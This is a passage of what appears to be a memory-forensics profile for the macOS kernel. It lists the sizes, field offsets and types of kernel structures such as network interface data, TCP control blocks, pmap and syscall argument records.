    'uid': [0x10, ['int']],
    'uid_l_': [0x10, ['array', 0, ['char']]],
    'uid_r_': [0x14, ['array', 4, ['char']]],
    'arg_l_': [0x18, ['array', 0, ['char']]],
    'arg': [0x18, ['unsigned long long']],
    'arg_r_': [0x20, ['array', 0, ['char']]],
}],
  'sem_open_args': [ 0x20, {
    'name': [0x0, ['unsigned long long']],
    'name_l_': [0x0, ['array', 0, ['char']]],
    'oflag': [0x8, ['int']],
    'name_r_': [0x8, ['array', 0, ['char']]],
    'oflag_l_': [0x8, ['array', 0, ['char']]],
    'oflag_r_': [0xc, ['array', 4, ['char']]],
    'mode_l_': [0x10, ['array', 0, ['char']]],
    'mode': [0x10, ['int']],
    'mode_r_': [0x14, ['array', 4, ['char']]],
    'value': [0x18, ['int']],
    'value_l_': [0x18, ['array', 0, ['char']]],
    'value_r_': [0x1c, ['array', 4, ['char']]],
}],
  '__unnamed_15767487': [ 0xd0, {
    'msg32': [0x0, ['__unnamed_15767492']],
    'msg64': [0x0, ['__unnamed_15767562']],
}],
  'dtrace_key': [ 0x10, {
    'dttk_value': [0x0, ['unsigned long long']],
    'dttk_size': [0x8, ['unsigned long long']],
}],
  'if_data': [ 0x60, {
    'ifi_type': [0x0, ['unsigned char']],
    'ifi_typelen': [0x1, ['unsigned char']],
    'ifi_physical': [0x2, ['unsigned char']],
    'ifi_addrlen': [0x3, ['unsigned char']],
    'ifi_hdrlen': [0x4, ['unsigned char']],
    'ifi_recvquota': [0x5, ['unsigned char']],
    'ifi_xmitquota': [0x6, ['unsigned char']],
    'ifi_unused1': [0x7, ['unsigned char']],
    'ifi_mtu': [0x8, ['unsigned int']],
    'ifi_metric': [0xc, ['unsigned int']],
    'ifi_baudrate': [0x10, ['unsigned int']],
    'ifi_ipackets': [0x14, ['unsigned int']],
    'ifi_ierrors': [0x18, ['unsigned int']],
    'ifi_opackets': [0x1c, ['unsigned int']],
    'ifi_oerrors': [0x20, ['unsigned int']],
    'ifi_collisions': [0x24, ['unsigned int']],
    'ifi_ibytes': [0x28, ['unsigned int']],
    'ifi_obytes': [0x2c, ['unsigned int']],
    'ifi_imcasts': [0x30, ['unsigned int']],
    'ifi_omcasts': [0x34, ['unsigned int']],
    'ifi_iqdrops': [0x38, ['unsigned int']],
    'ifi_noproto': [0x3c, ['unsigned int']],
    'ifi_recvtiming': [0x40, ['unsigned int']],
    'ifi_xmittiming': [0x44, ['unsigned int']],
    'ifi_lastchange': [0x48, ['timeval32']],
    'ifi_unused2': [0x50, ['unsigned int']],
    'ifi_hwassist': [0x54, ['unsigned int']],
    'ifi_reserved1': [0x58, ['unsigned int']],
    'ifi_reserved2': [0x5c, ['unsigned int']],
}],
  'vm_extmod_statistics': [ 0x30, {
    'task_for_pid_count': [0x0, ['long long']],
    'task_for_pid_caller_count': [0x8, ['long long']],
    'thread_creation_count': [0x10, ['long long']],
    'thread_creation_caller_count': [0x18, ['long long']],
    'thread_set_state_count': [0x20, ['long long']],
    'thread_set_state_caller_count': [0x28, ['long long']],
}],
  '__unnamed_7035064': [ 0x1c, {
    'sa': [0x0, ['sockaddr']],
    'v4': [0x0, ['sockaddr_in']],
    'v6': [0x0, ['sockaddr_in6']],
}],
  'i386_avx_state': [ 0x2cc, {
    'fpu_reserved': [0x0, ['array', 2, ['int']]],
    'fpu_fcw': [0x8, ['fp_control']],
    'fpu_fsw': [0xa, ['fp_status']],
    'fpu_ftw': [0xc, ['unsigned char']],
    'fpu_rsrv1': [0xd, ['unsigned char']],
    'fpu_fop': [0xe, ['unsigned short']],
    'fpu_ip': [0x10, ['unsigned int']],
    'fpu_cs': [0x14, ['unsigned short']],
    'fpu_rsrv2': [0x16, ['unsigned short']],
    'fpu_dp': [0x18, ['unsigned int']],
    'fpu_ds': [0x1c, ['unsigned short']],
    'fpu_rsrv3': [0x1e, ['unsigned short']],
    'fpu_mxcsr': [0x20, ['unsigned int']],
    'fpu_mxcsrmask': [0x24, ['unsigned int']],
    'fpu_stmm0': [0x28, ['mmst_reg']],
    'fpu_stmm1': [0x38, ['mmst_reg']],
    'fpu_stmm2': [0x48, ['mmst_reg']],
    'fpu_stmm3': [0x58, ['mmst_reg']],
    'fpu_stmm4': [0x68, ['mmst_reg']],
    'fpu_stmm5': [0x78, ['mmst_reg']],
    'fpu_stmm6': [0x88, ['mmst_reg']],
    'fpu_stmm7': [0x98, ['mmst_reg']],
    'fpu_xmm0': [0xa8, ['xmm_reg']],
    'fpu_xmm1': [0xb8, ['xmm_reg']],
    'fpu_xmm2': [0xc8, ['xmm_reg']],
    'fpu_xmm3': [0xd8, ['xmm_reg']],
    'fpu_xmm4': [0xe8, ['xmm_reg']],
    'fpu_xmm5': [0xf8, ['xmm_reg']],
    'fpu_xmm6': [0x108, ['xmm_reg']],
    'fpu_xmm7': [0x118, ['xmm_reg']],
    'fpu_rsrv4': [0x128, ['array', 224, ['char']]],
    'fpu_reserved1': [0x208, ['int']],
    '__avx_reserved1': [0x20c, ['array', 64, ['char']]],
    '__fpu_ymmh0': [0x24c, ['xmm_reg']],
    '__fpu_ymmh1': [0x25c, ['xmm_reg']],
    '__fpu_ymmh2': [0x26c, ['xmm_reg']],
    '__fpu_ymmh3': [0x27c, ['xmm_reg']],
    '__fpu_ymmh4': [0x28c, ['xmm_reg']],
    '__fpu_ymmh5': [0x29c, ['xmm_reg']],
    '__fpu_ymmh6': [0x2ac, ['xmm_reg']],
    '__fpu_ymmh7': [0x2bc, ['xmm_reg']],
}],
  '__unnamed_7033911': [ 0x1c, {
    'v4': [0x0, ['sockaddr_in']],
    'v6': [0x0, ['sockaddr_in6']],
}],
  '__unnamed_12877919': [ 0x10, {
    'opaque': [0x0, ['array', 2, ['unsigned long']]],
}],
  'pf_pptp_ctrl_call_in_1st': [ 0xd0, {
    'call_id': [0x0, ['unsigned short']],
    'call_sernum': [0x2, ['unsigned short']],
    'bearer_type': [0x4, ['unsigned int']],
    'phy_channel_id': [0x8, ['unsigned int']],
    'dialed_number_len': [0xc, ['unsigned short']],
    'dialing_number_len': [0xe, ['unsigned short']],
    'dialed_num': [0x10, ['array', 64, ['unsigned char']]],
    'dialing_num': [0x50, ['array', 64, ['unsigned char']]],
    'sub_addr': [0x90, ['array', 64, ['unsigned char']]],
}],
  'mdev': [ 0x30, {
    'mdBase': [0x0, ['unsigned long long']],
    'mdSize': [0x8, ['unsigned int']],
    'mdFlags': [0xc, ['int']],
    'mdSecsize': [0x10, ['int']],
    'mdBDev': [0x14, ['int']],
    'mdCDev': [0x18, ['int']],
    'mdbdevb': [0x20, ['pointer', ['void']]],
    'mdcdevb': [0x28, ['pointer', ['void']]],
}],
  'delayqueue': [ 0x10, {
    'tqh_first': [0x0, ['pointer', ['buf']]],
    'tqh_last': [0x8, ['pointer', ['pointer', ['buf']]]],
}],
  '_ipfw_insn_u16': [ 0x8, {
    'o': [0x0, ['_ipfw_insn']],
    'ports': [0x4, ['array', 2, ['unsigned short']]],
}],
  'user32_kevent': [ 0x14, {
    'ident': [0x0, ['unsigned int']],
    'filter': [0x4, ['short']],
    'flags': [0x6, ['unsigned short']],
    'fflags': [0x8, ['unsigned int']],
    'data': [0xc, ['int']],
    'udata': [0x10, ['unsigned int']],
}],
  '__unnamed_5434530': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['nfsrv_sock']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['nfsrv_sock']]]],
}],
  'nd_neighbor_advert': [ 0x18, {
    'nd_na_hdr': [0x0, ['icmp6_hdr']],
    'nd_na_target': [0x8, ['in6_addr']],
}],
  '__unnamed_7619429': [ 0x10, {
    'le_next': [0x0, ['pointer', ['iptap_softc']]],
    'le_prev': [0x8, ['pointer', ['pointer', ['iptap_softc']]]],
}],
  'pf_pptp_ctrl_start_rpy': [ 0x90, {
    'protocol_version': [0x0, ['unsigned short']],
    'result_code': [0x2, ['unsigned char']],
    'error_code': [0x3, ['unsigned char']],
    'framing_capabilities': [0x4, ['unsigned int']],
    'bearer_capabilities': [0x8, ['unsigned int']],
    'maximum_channels': [0xc, ['unsigned short']],
    'firmware_revision': [0xe, ['unsigned short']],
    'host_name': [0x10, ['array', 64, ['unsigned char']]],
    'vendor_string': [0x50, ['array', 64, ['unsigned char']]],
}],
  'user32_fssearchblock': [ 0x40, {
    'returnattrs': [0x0, ['unsigned int']],
    'returnbuffer': [0x4, ['unsigned int']],
    'returnbuffersize': [0x8, ['unsigned int']],
    'maxmatches': [0xc, ['unsigned int']],
    'timelimit': [0x10, ['user32_timeval']],
    'searchparams1': [0x18, ['unsigned int']],
    'sizeofsearchparams1': [0x1c, ['unsigned int']],
    'searchparams2': [0x20, ['unsigned int']],
    'sizeofsearchparams2': [0x24, ['unsigned int']],
    'searchattrs': [0x28, ['attrlist']],
}],
  '__unnamed_4848846': [ 0xc, {
    'rp_auth': [0x0, ['auth_info']],
    'rp_rstatus': [0x8, ['unsigned int']],
}],
  'c_segment': [ 0x90, {
    'c_lock': [0x0, ['_lck_mtx_']],
    'c_age_list': [0x10, ['queue_entry']],
    'c_list': [0x20, ['queue_entry']],
    'c_generation_id': [0x30, ['unsigned long long']],
    'c_bytes_used': [0x38, ['int']],
    'c_bytes_unused': [0x3c, ['int']],
    'c_ondisk': [0x40, ['BitField', {'end_bit': 25, 'start_bit': 24}]],
    'c_filling': [0x40, ['BitField', {'end_bit': 20, 'start_bit': 19}]],
    'c_on_swappedout_q': [0x40, ['BitField', {'end_bit': 31, 'start_bit': 30}]],
    'c_was_swapped_in': [0x40, ['BitField', {'end_bit': 26, 'start_bit': 25}]],
    'c_on_swappedin_q': [0x40, ['BitField', {'end_bit': 29, 'start_bit': 28}]],
    'c_on_minorcompact_q': [0x40, ['BitField', {'end_bit': 27, 'start_bit': 26}]],
    'c_on_age_q': [0x40, ['BitField', {'end_bit': 28, 'start_bit': 27}]],
    'c_busy_swapping': [0x40, ['BitField', {'end_bit': 22, 'start_bit': 21}]],
    'c_mysegno': [0x40, ['BitField', {'end_bit': 19, 'start_bit': 0}]],
    'c_busy': [0x40, ['BitField', {'end_bit': 21, 'start_bit': 20}]],
    'c_on_swapout_q': [0x40, ['BitField', {'end_bit': 30, 'start_bit': 29}]],
    'c_must_free': [0x40, ['BitField', {'end_bit': 24, 'start_bit': 23}]],
    'c_wanted': [0x40, ['BitField', {'end_bit': 23, 'start_bit': 22}]],
    'c_on_swappedout_sparse_q': [0x40, ['BitField', {'end_bit': 32, 'start_bit': 31}]],
    'c_firstemptyslot': [0x44, ['unsigned short']],
    'c_nextslot': [0x46, ['unsigned short']],
    'c_nextoffset': [0x48, ['unsigned int']],
    'c_populated_offset': [0x4c, ['unsigned int']],
    'c_creation_ts': [0x50, ['unsigned int']],
    'c_swappedin_ts': [0x54, ['unsigned int']],
    'c_store': [0x58, ['__unnamed_2415580']],
    'c_slots': [0x60, ['array', 6, ['pointer', ['c_slot']]]],
}],
  'cmsghdr': [ 0xc, {
    'cmsg_len': [0x0, ['unsigned int']],
    'cmsg_level': [0x4, ['int']],
    'cmsg_type': [0x8, ['int']],
}],
  'ioGMDData': [ 0x58, {
    'fMapper': [0x0, ['pointer', ['IOMapper_class']]],
    'fDMAMapNumAddressBits': [0x8, ['unsigned char']],
    'fDMAMapAlignment': [0x10, ['unsigned long long']],
    'fMappedBase': [0x18, ['unsigned long long']],
    'fPreparationID': [0x20, ['unsigned long long']],
    'fPageCnt': [0x28, ['unsigned int']],
    'fDiscontig': [0x2c, ['unsigned char']],
    'fPad': [0x2d, ['array', 3, ['unsigned char']]],
    'fPageList': [0x30, ['array', 1, ['upl_page_info']]],
    'fBlocks': [0x38, ['array', 1, ['ioPLBlock']]],
}],
  '__unnamed_7486971': [ 0x8, {
    'fru_ipv4': [0x0, ['pointer', ['ip']]],
    'fru_ipv6': [0x0, ['pointer', ['ip6_hdr']]],
}],
  'kev_dl_node_absence': [ 0x48, {
    'link_data': [0x0, ['net_event_data']],
    'sin6_node_address': [0x18, ['sockaddr_in6']],
    'sdl_node_address': [0x34, ['sockaddr_dl']],
}],
  'IOEventSource_class': [ 0x48, {
    'superClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'gMetaClass': [0x0, ['MetaClass_class']],
    'metaClass': [0x0, ['pointer', ['OSMetaClass_class']]],
    'eventChainNext': [0x10, ['pointer', ['IOEventSource_class']]],
    'owner': [0x18, ['pointer', ['OSObject_class']]],
    'action': [0x20, ['pointer', ['void']]],
    'enabled': [0x28, ['int']],
    'workLoop': [0x30, ['pointer', ['IOWorkLoop_class']]],
    'refcon': [0x38, ['pointer', ['void']]],
    'reserved': [0x40, ['pointer', ['ExpansionData']]],
}],
  'in6m_st': [ 0xa, {
    'iss_fmode': [0x0, ['unsigned short']],
    'iss_asm': [0x2, ['unsigned short']],
    'iss_ex': [0x4, ['unsigned short']],
    'iss_in': [0x6, ['unsigned short']],
    'iss_rec': [0x8, ['unsigned short']],
}],
  'xtcpcb64': [ 0x1d8, {
    'xt_len': [0x0, ['unsigned int']],
    'xt_inpcb': [0x4, ['xinpcb64']],
    't_segq': [0x108, ['unsigned long long']],
    't_dupacks': [0x110, ['int']],
    't_timer': [0x114, ['array', 4, ['int']]],
    't_state': [0x124, ['int']],
    't_flags': [0x128, ['unsigned int']],
    't_force': [0x12c, ['int']],
    'snd_una': [0x130, ['unsigned int']],
    'snd_max': [0x134, ['unsigned int']],
    'snd_nxt': [0x138, ['unsigned int']],
    'snd_up': [0x13c, ['unsigned int']],
    'snd_wl1': [0x140, ['unsigned int']],
    'snd_wl2': [0x144, ['unsigned int']],
    'iss': [0x148, ['unsigned int']],
    'irs': [0x14c, ['unsigned int']],
    'rcv_nxt': [0x150, ['unsigned int']],
    'rcv_adv': [0x154, ['unsigned int']],
    'rcv_wnd': [0x158, ['unsigned int']],
    'rcv_up': [0x15c, ['unsigned int']],
    'snd_wnd': [0x160, ['unsigned int']],
    'snd_cwnd': [0x164, ['unsigned int']],
    'snd_ssthresh': [0x168, ['unsigned int']],
    't_maxopd': [0x16c, ['unsigned int']],
    't_rcvtime': [0x170, ['unsigned int']],
    't_starttime': [0x174, ['unsigned int']],
    't_rtttime': [0x178, ['int']],
    't_rtseq': [0x17c, ['unsigned int']],
    't_rxtcur': [0x180, ['int']],
    't_maxseg': [0x184, ['unsigned int']],
    't_srtt': [0x188, ['int']],
    't_rttvar': [0x18c, ['int']],
    't_rxtshift': [0x190, ['int']],
    't_rttmin': [0x194, ['unsigned int']],
    't_rttupdated': [0x198, ['unsigned int']],
    'max_sndwnd': [0x19c, ['unsigned int']],
    't_softerror': [0x1a0, ['int']],
    't_oobflags': [0x1a4, ['char']],
    't_iobc': [0x1a5, ['char']],
    'snd_scale': [0x1a6, ['unsigned char']],
    'rcv_scale': [0x1a7, ['unsigned char']],
    'request_r_scale': [0x1a8, ['unsigned char']],
    'requested_s_scale': [0x1a9, ['unsigned char']],
    'ts_recent': [0x1ac, ['unsigned int']],
    'ts_recent_age': [0x1b0, ['unsigned int']],
    'last_ack_sent': [0x1b4, ['unsigned int']],
    'cc_send': [0x1b8, ['unsigned int']],
    'cc_recv': [0x1bc, ['unsigned int']],
    'snd_recover': [0x1c0, ['unsigned int']],
    'snd_cwnd_prev': [0x1c4, ['unsigned int']],
    'snd_ssthresh_prev': [0x1c8, ['unsigned int']],
    't_badrxtwin': [0x1cc, ['unsigned int']],
    'xt_alignment_hack': [0x1d0, ['unsigned long long']],
}],
  'vnode_pager': [ 0x28, {
    'pager_header': [0x0, ['ipc_object_header']],
    'pager_ops': [0x8, ['pointer', ['memory_object_pager_ops']]],
    'ref_count': [0x10, ['unsigned int']],
    'control_handle': [0x18, ['pointer', ['memory_object_control']]],
    'vnode_handle': [0x20, ['pointer', ['vnode']]],
}],
  'psynch_rw_unlock2_args': [ 0x28, {
    'rwlock': [0x0, ['unsigned long long']],
    'rwlock_l_': [0x0, ['array', 0, ['char']]],
    'lgenval': [0x8, ['unsigned int']],
    'lgenval_l_': [0x8, ['array', 0, ['char']]],
    'rwlock_r_': [0x8, ['array', 0, ['char']]],
    'lgenval_r_': [0xc, ['array', 4, ['char']]],
    'ugenval': [0x10, ['unsigned int']],
    'ugenval_l_': [0x10, ['array', 0, ['char']]],
    'ugenval_r_': [0x14, ['array', 4, ['char']]],
    'rw_wc': [0x18, ['unsigned int']],
    'rw_wc_l_': [0x18, ['array', 0, ['char']]],
    'rw_wc_r_': [0x1c, ['array', 4, ['char']]],
    'flags': [0x20, ['int']],
    'flags_l_': [0x20, ['array', 0, ['char']]],
    'flags_r_': [0x24, ['array', 4, ['char']]],
}],
  'cqrq_throttle': [ 0x8, {
    'set': [0x0, ['unsigned int']],
    'level': [0x4, ['unsigned int']],
}],
  '__unnamed_4576033': [ 0x38, {
    'receive': [0x0, ['__unnamed_4576038']],
    'misc': [0x0, ['int']],
    'swtch': [0x0, ['__unnamed_4576322']],
    'sema': [0x0, ['__unnamed_4576220']],
}],
  'thread_policy_state': [ 0x40, {
    'requested': [0x0, ['int']],
    'effective': [0x4, ['int']],
    'pending': [0x8, ['int']],
    'reserved': [0xc, ['array', 13, ['int']]],
}],
  '__unnamed_15767492': [ 0x6c, {
    'notifyHdr': [0x0, ['OSNotificationHeader']],
    'asyncContent': [0x28, ['IOAsyncCompletionContent']],
    'args': [0x2c, ['array', 16, ['unsigned int']]],
}],
  '__unnamed_9394874': [ 0x8, {
    '_fwa_dst6': [0x0, ['pointer', ['sockaddr_in6']]],
    '_fwa_dst': [0x0, ['pointer', ['sockaddr_in']]],
}],
  'fileport_fdtype_args': [ 0x10, {
    'ffa_pfi': [0x0, ['pointer', ['proc_fileportinfo']]],
    'ffa_pfi_end': [0x8, ['pointer', ['proc_fileportinfo']]],
}],
  'mntlist': [ 0x10, {
    'tqh_first': [0x0, ['pointer', ['mount']]],
    'tqh_last': [0x8, ['pointer', ['pointer', ['mount']]]],
}],
  'klist': [ 0x8, {
    'slh_first': [0x0, ['pointer', ['knote']]],
}],
  'pf_ifspeed': [ 0x18, {
    'ifname': [0x0, ['array', 16, ['char']]],
    'baudrate': [0x10, ['unsigned long long']],
}],
  'nchashhead': [ 0x8, {
    'lh_first': [0x0, ['pointer', ['namecache']]],
}],
  'call_entry': [ 0x40, {
    'q_link': [0x0, ['queue_entry']],
    'queue': [0x10, ['pointer', ['queue_entry']]],
    'func': [0x18, ['pointer', ['void']]],
    'param0': [0x20, ['pointer', ['void']]],
    'param1': [0x28, ['pointer', ['void']]],
    'deadline': [0x30, ['unsigned long long']],
    'entry_time': [0x38, ['unsigned long long']],
}],
  'ifnet_flowhash_key': [ 0x30, {
    'ifk_name': [0x0, ['array', 16, ['char']]],
    'ifk_unit': [0x10, ['unsigned int']],
    'ifk_flags': [0x14, ['unsigned int']],
    'ifk_eflags': [0x18, ['unsigned int']],
    'ifk_capabilities': [0x1c, ['unsigned int']],
    'ifk_capenable': [0x20, ['unsigned int']],
    'ifk_output_sched_model': [0x24, ['unsigned int']],
    'ifk_rand1': [0x28, ['unsigned int']],
    'ifk_rand2': [0x2c, ['unsigned int']],
}],
  'inp_stat': [ 0x20, {
    'rxpackets': [0x0, ['unsigned long long']],
    'rxbytes': [0x8, ['unsigned long long']],
    'txpackets': [0x10, ['unsigned long long']],
    'txbytes': [0x18, ['unsigned long long']],
}],
  'fasttrap_bucket': [ 0x40, {
    'ftb_mtx': [0x0, ['__unnamed_12808295']],
    'ftb_data': [0x10, ['pointer', ['void']]],
    'ftb_pad': [0x18, ['array', 40, ['unsigned char']]],
}],
  'pf_state_key': [ 0x98, {
    'lan': [0x0, ['pf_state_host']],
    'gwy': [0x14, ['pf_state_host']],
    'ext': [0x28, ['pf_state_host']],
    'af': [0x3c, ['unsigned char']],
    'proto': [0x3d, ['unsigned char']],
    'direction': [0x3e, ['unsigned char']],
    'proto_variant': [0x3f, ['unsigned char']],
    'app_state': [0x40, ['pointer', ['pf_app_state']]],
    'flowsrc': [0x48, ['unsigned int']],
    'flowhash': [0x4c, ['unsigned int']],
    'entry_lan_ext': [0x50, ['__unnamed_7510202']],
    'entry_ext_gwy': [0x68, ['__unnamed_7510272']],
    'states': [0x80, ['pf_statelist']],
    'refcnt': [0x90, ['unsigned int']],
}],
  'nfs_export_net_args': [ 0x168, {
    'nxna_flags': [0x0, ['unsigned int']],
    'nxna_cred': [0x4, ['xucred']],
    'nxna_addr': [0x50, ['sockaddr_storage']],
    'nxna_mask': [0xd0, ['sockaddr_storage']],
    'nxna_sec': [0x150, ['nfs_sec']],
}],
  'if_clonereq64': [ 0x10, {
    'ifcr_total': [0x0, ['int']],
    'ifcr_count': [0x4, ['int']],
    'ifcru_buffer': [0x8, ['unsigned long long']],
}],
  '_OpenFileContext': [ 0x10, {
    'extents': [0x0, ['pointer', ['OSData_class']]],
    'size': [0x8, ['unsigned long long']],
}],
  'pflog_softc': [ 0x20, {
    'sc_if': [0x0, ['pointer', ['ifnet']]],
    'sc_unit': [0x8, ['int']],
    'sc_list': [0x10, ['__unnamed_7263837']],
}],
  'vfsquery': [ 0x80, {
    'vq_flags': [0x0, ['unsigned int']],
    'vq_spare': [0x4, ['array', 31, ['unsigned int']]],
}],
  'z_stream_s': [ 0x70, {
    'next_in': [0x0, ['pointer', ['unsigned char']]],
    'avail_in': [0x8, ['unsigned int']],
    'total_in': [0x10, ['unsigned long']],
    'next_out': [0x18, ['pointer', ['unsigned char']]],
    'avail_out': [0x20, ['unsigned int']],
    'total_out': [0x28, ['unsigned long']],
    'msg': [0x30, ['pointer', ['char']]],
    'state': [0x38, ['pointer', ['internal_state']]],
    'zalloc': [0x40, ['pointer', ['void']]],
    'zfree': [0x48, ['pointer', ['void']]],
    'opaque': [0x50, ['pointer', ['void']]],
    'data_type': [0x58, ['int']],
    'adler': [0x60, ['unsigned long']],
    'reserved': [0x68, ['unsigned long']],
}],
  '__unnamed_4453854': [ 0x8, {
    'vou_cache_pages_to_scan': [0x0, ['int']],
    'vou_size': [0x0, ['unsigned long long']],
}],
  'host_self_trap_args': [ 0x4, {
    'dummy': [0x0, ['int']],
}],
  'pmap': [ 0x138, {
    'lock': [0x0, ['slock']],
    'pm_cr3': [0x8, ['unsigned long long']],
    'pm_shared': [0x10, ['int']],
    'dirbase': [0x18, ['pointer', ['unsigned long long']]],
    'pm_obj': [0x20, ['pointer', ['vm_object']]],
    'pm_task_map': [0x28, ['Enumeration', {'target': 'int', 'choices': {0: 'TASK_MAP_32BIT', 1: 'TASK_MAP_64BIT'}}]],
    'pm_pdpt': [0x30, ['pointer', ['unsigned long long']]],
    'pm_pml4': [0x38, ['pointer', ['unsigned long long']]],
    'pm_obj_pdpt': [0x40, ['pointer', ['vm_object']]],
    'pm_obj_pml4': [0x48, ['pointer', ['vm_object']]],
    'pmap_pcid_cpus': [0x50, ['array', 48, ['unsigned short']]],
    'pmap_pcid_coherency_vector': [0xb0, ['array', 48, ['unsigned char']]],
    'stats': [0xe0, ['pmap_statistics']],
    'ref_count': [0x128, ['int']],
    'nx_enabled': [0x12c, ['int']],
    'ledger': [0x130, ['pointer', ['ledger']]],
}],
  'mcache_cpu': [ 0x40, {
    'cc_lock': [0x0, ['__unnamed_11979823']],
    'cc_filled': [0x10, ['pointer', ['mcache_bkt']]],
    'cc_pfilled': [0x18, ['pointer', ['mcache_bkt']]],
    'cc_alloc': [0x20, ['unsigned long long']],
    'cc_free': [0x28, ['unsigned long long']],
    'cc_objs': [0x30, ['int']],
    'cc_pobjs': [0x34, ['int']],
    'cc_bktsize': [0x38, ['int']],
}],
  'recvmsg_nocancel_args': [ 0x18, {
    's_l_': [0x0, ['array', 0, ['char']]],
    's': [0x0, ['int']],
    's_r_': [0x4, ['array', 4, ['char']]],
    'msg_l_': [0x8, ['array', 0, ['char']]],
    'msg': [0x8, ['unsigned long long']],
    'flags_l_': [0x10, ['array', 0, ['char']]],
    'msg_r_': [0x10, ['array', 0, ['char']]],
    'flags': [0x10, ['int']],
    'flags_r_': [0x14, ['array', 4, ['char']]],
}],
  'IOTimerEventSourceCounter': [ 0x8, {
    'timeouts': [0x0, ['unsigned int']],
    'checksForWork': [0x4, ['unsigned int']],
}],
  '__disable_threadsignal_args': [ 0x8, {
    'value_l_': [0x0, ['array', 0, ['char']]],
    'value': [0x0, ['int']],
    'value_r_': [0x4, ['array', 4, ['char']]],
}],
  '_wait_queue_link': [ 0x48, {
    'wql_element': [0x0, ['wait_queue_element']],
    'wql_setlinks': [0x20, ['queue_entry']],
    'wql_preposts': [0x30, ['queue_entry']],
    'wql_setqueue': [0x40, ['pointer', ['wait_queue_set']]],
}],
  'vm_shared_region_slide_info_entry': [ 0x14, {
    'version': [0x0, ['unsigned int']],
    'toc_offset': [0x4, ['unsigned int']],
    'toc_count': [0x8, ['unsigned int']],
    'entry_offset': [0xc, ['unsigned int']],
    'entry_count': [0x10, ['unsigned int']],
}],
  'shift_data': [ 0x8, {
    'shift1': [0x0, ['int']],
    'shift2': [0x4, ['int']],
}],
  'nd_router_advert': [ 0x10, {
    'nd_ra_hdr': [0x0, ['icmp6_hdr']],
    'nd_ra_reachable': [0x8, ['unsigned int']],
    'nd_ra_retransmit': [0xc, ['unsigned int']],
}],
  '_kernelrpc_mach_port_guard_args': [ 0x20, {
    'target': [0x0, ['unsigned int']],
    'target_l_': [0x0, ['array', 0, ['char']]],
    'target_r_': [0x4, ['array', 4, ['char']]],
    'name_l_': [0x8, ['array', 0, ['char']]],
    'name': [0x8, ['unsigned int']],
    'name_r_': [0xc, ['array', 4, ['char']]],
    'guard_l_': [0x10, ['array', 0, ['char']]],
    'guard': [0x10, ['unsigned long long']],
    'strict_l_': [0x18, ['array', 0, ['char']]],
    'guard_r_': [0x18, ['array', 0, ['char']]],
    'strict': [0x18, ['int']],
    'strict_r_': [0x1c, ['array', 4, ['char']]],
}],
  '__unnamed_10548420': [ 0x10, {
    'tqe_next': [0x0, ['pointer', ['rl_entry']]],
    'tqe_prev': [0x8, ['pointer', ['pointer', ['rl_entry']]]],
}],
  '__unnamed_6543071': [ 0x8, {
    'ifbacu_buf': [0x0, ['unsigned long long']],
    'ifbacu_req': [0x0, ['unsigned long long']],
}],
  'user_fsignatures': [ 0x18, {
    'fs_file_start': [0x0, ['long long']],
    'fs_blob_start': [0x8, ['unsigned long long']],
    'fs_blob_size': [0x10, ['unsigned long long']],
}],
  'mach_host_subsystem': [ 0x390, {
    'server': [0x0, ['pointer', ['void']]],
    'start': [0x8, ['int']],
    'end': [0xc, ['int']],
    'maxsize': [0x10, ['unsigned int']],
    'reserved': [0x18, ['unsigned long']],
    'routine': [0x20, ['array', 22, ['routine_descriptor']]],
}],
  'xcpmio_qos_names': [ 0x104, {
    'xcpm_qos_name_count': [0x0, ['unsigned int']],
    'xcpm_qos_name': [0x4, ['array', 16, ['array', 16, ['char']]]],
}],
  'nstat_msg_error': [ 0x14, {
    'hdr': [0x0, ['nstat_msg_hdr']],
    'error': [0x10, ['unsigned int']],
}],
  'host_basic_info': [ 0x30, {
    'max_cpus': [0x0, ['int']],
    'avail_cpus': [0x4, ['int']],
    'memory_size': [0x8, ['unsigned int']],
    'cpu_type': [0xc, ['int']],
    'cpu_subtype': [0x10, ['int']],
    'cpu_threadtype': [0x14, ['int']],
    'physical_cpu': [0x18, ['int']],
    'physical_cpu_max': [0x1c, ['int']],
    'logical_cpu': [0x20, ['int']],
    'logical_cpu_max': [0x24, ['int']],
    'max_mem': [0x28, ['unsigned long long']],
}],
  '__unnamed_4599344': [ 0x40, {
    'lck_grp_mtx_util_cnt': [0x0, ['unsigned long long']],
    'lck_grp_mtx_held_cnt': [0x8, ['unsigned long long']],
    'lck_grp_mtx_miss_cnt': [0x10, ['unsigned long long']],
    'lck_grp_mtx_wait_cnt': [0x18, ['unsigned long long']],
    'lck_grp_mtx_held_max': [0x20, ['unsigned long long']],
    'lck_grp_mtx_held_cum': [0x28, ['unsigned long long']],
    'lck_grp_mtx_wait_max': [0x30, ['unsigned long long']],
    'lck_grp_mtx_wait_cum': [0x38, ['unsigned long long']],
}],
  'vnode_trigger_info': [ 0x30, {
    'vti_resolve_func': [0x0, ['pointer', ['void']]],
    'vti_unresolve_func': [0x8, ['pointer', ['void']]],
    'vti_rearm_func': [0x10, ['pointer', ['void']]],
    'vti_reclaim_func': [0x18, ['pointer', ['void']]],
    'vti_data': [0x20, ['pointer', ['void']]],
    'vti_flags': [0x28, ['unsigned int']],
}],
  'rawcb_list_head': [ 0x8, {
    'lh_first': [0x0, ['pointer', ['rawcb']]],
}],
  'xsocket': [ 0x64, {
    'xso_len': [0x0, ['unsigned int']],
    'xso_so': [0x4, ['unsigned int']],
    'so_type': [0x8, ['short']],
    'so_options': [0xa, ['short']],
    'so_linger': [0xc, ['short']],
    'so_state': [0xe, ['short']],
    'so_pcb': [0x10, ['unsigned int']],
    'xso_protocol': [0x14, ['int']],
    'xso_family': [0x18, ['int']],
    'so_qlen': [0x1c, ['short']],
    'so_incqlen': [0x1e, ['short']],
    'so_qlimit': [0x20, ['short']],
    'so_timeo': [0x22, ['short']],
    'so_error': [0x24, ['unsigned short']],
    'so_pgid': [0x28, ['int']],
    'so_oobmark': [0x2c, ['unsigned int']],
    'so_rcv': [0x30, ['xsockbuf']],
    'so_snd': [0x48, ['xsockbuf']],
    'so_uid': [0x60, ['unsigned int']],
}],
  'mach_port_status': [ 0x28, {
    'mps_pset': [0x0, ['unsigned int']],
    'mps_seqno': [0x4, ['unsigned int']],
    'mps_mscount': [0x8, ['unsigned int']],
    'mps_qlimit': [0xc, ['unsigned int']],
    'mps_msgcount': [0x10, ['unsigned int']],
    'mps_sorights': [0x14, ['unsigned int']],
    'mps_srights': [0x18, ['int']],
    'mps_pdrequest': [0x1c, ['int']],
